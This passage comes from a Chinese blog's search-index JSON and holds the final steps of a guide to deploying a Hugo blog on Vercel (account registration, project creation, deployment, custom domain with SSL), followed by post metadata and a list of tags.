注册账号\n通过Git仓库账号关联注册，如果注册中出现错误，检查下账号是不是QQ邮箱。\nVercel不支持QQ邮箱，以GitHub为例，可以修改GitHub的默认邮箱。\nGitHub -\u0026gt; Settings -\u0026gt; Emails -\u0026gt; Primary email address 2.3.2 创建project 点击 New Project 输入前面创建的GitHub仓库的地址\n在线安装vercel\nGitHub -\u0026gt; Settings -\u0026gt; Applications -\u0026gt; Vercel -\u0026gt; Configure 选择项目 ，选择项目框架\n点击 Deploy部署项目\n点击 DOMAINS下面的xxxxx-vercel-app就能访问你的主页了\n2.3.3 设置域名 Vercel -\u0026gt; Project-\u0026gt; Settings -\u0026gt; Domains 生效后会自动签发SSL证书，开启HTTPS\n","id":10,"section":"posts","summary":"一、背景介绍 博主之前使用Hexo 搭建博客，用了三年，这个工具最大的缺点就是，每次更新blog后，项目运行跟打包的速度有点慢，直到近期在冲浪的","tags":["Hugo","Vercel","Git Pages"],"title":"hugo搭建个人博客","uri":"https://lincx-911.github.io/2021/12/first/","year":"2021"}],"tags":[{"title":"csapp-lab","uri":"https://lincx-911.github.io/tags/csapp-lab/"},{"title":"Git Pages","uri":"https://lincx-911.github.io/tags/git-pages/"},{"title":"Gitee","uri":"https://lincx-911.github.io/tags/gitee/"},{"title":"Hugo","uri":"https://lincx-911.github.io/tags/hugo/"},{"title":"lincxlock","uri":"https://lincx-911.github.io/tags/lincxlock/"},{"title":"Markdown","uri":"https://lincx-911.github.io/tags/markdown/"},{"title":"Vercel","uri":"https://lincx-911.github.io/tags/vercel/"},{"title":"分布式","uri":"https://lincx-911.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"},{"title":"汇编","uri":"https://lincx-911.github.io/tags/%E6%B1%87%E7%BC%96/"},{"title":"集群","uri":"https://lincx-911.github.io/tags/%E9%9B%86%E7%BE%A4/"}]}